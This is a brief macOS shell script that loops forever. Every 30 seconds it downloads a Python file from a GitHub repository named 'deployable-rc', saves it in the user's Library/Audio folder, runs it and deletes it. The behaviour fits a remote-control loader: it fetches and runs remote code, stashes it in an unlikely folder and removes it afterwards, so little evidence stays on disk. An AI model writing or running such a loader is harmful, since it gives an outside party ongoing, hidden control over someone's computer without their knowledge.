run() {
    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/main.py >/Users/$USER/Library/Audio/main.py

    python3 /Users/$USER/Library/Audio/main.py

    rm /Users/$USER/Library/Audio/main.py
}

while true; do
    run

    sleep "30s"
done
